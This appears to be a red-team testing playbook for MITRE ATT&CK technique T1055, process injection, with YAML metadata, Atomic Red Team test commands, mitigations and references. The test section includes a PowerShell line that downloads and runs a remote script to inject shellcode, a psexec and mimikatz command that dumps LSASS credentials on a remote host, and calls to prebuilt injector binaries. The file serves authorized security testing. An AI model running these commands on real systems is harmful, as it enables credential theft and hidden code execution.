---
name: "T1055_process-injection"
description: "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1055
  - defense-evasion
  - privilege-escalation
  - linux
  - macos
  - windows
technique_id: "T1055"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
  - privilege-escalation
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1055"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1055.001
  - T1055.002
  - T1055.003
  - T1055.004
  - T1055.005
  - T1055.008
  - T1055.009
  - T1055.011
  - T1055.012
  - T1055.013
  - T1055.014
  - T1055.015
prerequisites: []
severity_boost:
  T1055.001: "Chain with T1055.001 for deeper attack path"
  T1055.002: "Chain with T1055.002 for deeper attack path"
  T1055.003: "Chain with T1055.003 for deeper attack path"
---

# T1055 Process Injection

## High-Level Description

Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process.

There are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific.

More sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.

## Kill Chain Phase

- Defense Evasion (TA0005)
- Privilege Escalation (TA0004)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Process Injection technique is applicable to target environment
- [ ] Check Linux systems for indicators of Process Injection
- [ ] Check macOS systems for indicators of Process Injection
- [ ] Check Windows systems for indicators of Process Injection
- [ ] Verify mitigations are bypassed or absent (2 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Shellcode execution via VBA

This module injects shellcode into a newly created process and executes. By default the shellcode is created,
with Metasploit, for use on x86-64 Windows 10 machines.

Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation of Microsoft Office
is required.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
```

**Dependencies:**

- The 64-bit version of Microsoft Office must be installed
- "#{txt_path}" must exist on disk at specified location

### Atomic Test 2: Remote Process Injection in LSASS via mimikatz

Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).
Especially useful against domain controllers in Active Directory environments.
It must be executed in the context of a user who is privileged on remote `machine`.

The effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>

**Supported Platforms:** windows

```cmd
"#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
```

**Dependencies:**

- Mimikatz executor must exist on disk and at specified location (#{mimikatz_path})
- PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_path})

### Atomic Test 3: Section View Injection

This test creates a section object in the local process followed by a local section view.
The shellcode is copied into the local section view and a remote section view is created in the target process, pointing to the local section view.
A thread is then created in the target process, using the remote section view as start address.

**Supported Platforms:** windows

```powershell
$notepad = Start-Process notepad -passthru
Start-Process "$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"
```

### Atomic Test 4: Dirty Vanity process Injection

This test used the Windows undocumented remote-fork API RtlCreateProcessReflection to create a cloned process of the parent process
with shellcode written in its memory. The shellcode is executed after being forked to the child process. The technique was first presented at
BlackHat Europe 2022. Shellcode will open a messsage box and a notepad.

**Supported Platforms:** windows

```powershell
Start-Process "$PathToAtomicsFolder\T1055\bin\x64\redVanity.exe" #{pid}
```

### Atomic Test 5: Read-Write-Execute process Injection

This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.
The RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms
that relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.
The injected shellcode will open a message box and a notepad.
RWX Process Injection, also known as MockingJay, was introduced to the security community by SecurityJoes.
More details can be found at https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution.
The original injector and idea were developed for game cheats, as visible at https://github.com/M-r-J-o-h-n/SWH-Injector.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
$address = (& "$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe" "$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\" | Out-String | Select-String -Pattern "VirtualAddress: (\w+)").Matches.Groups[1].Value
& "PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe" "#{vuln_dll}" $address
```

**Dependencies:**

- Utility to inject must exist on disk at specified location (#{vuln_dll})

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Process Injection by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1055 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1026 Privileged Account Management

Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor.

### M1040 Behavior Prevention on Endpoint

Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection.

## Detection

### Behavioral Detection of Process Injection Across Platforms

## Risk Assessment

| Finding                                | Severity | Impact          |
| -------------------------------------- | -------- | --------------- |
| Process Injection technique applicable | High     | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [GNU Acct](https://www.gnu.org/software/acct/)
- [Elastic Process Injection July 2017](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)
- [RHEL auditd](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing)
- [Microsoft Sysmon v6 May 2017](https://docs.microsoft.com/sysinternals/downloads/sysmon)
- [Chokepoint preload rootkits](http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html)
- [Atomic Red Team - T1055](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1055)
- [MITRE ATT&CK - T1055](https://attack.mitre.org/techniques/T1055)
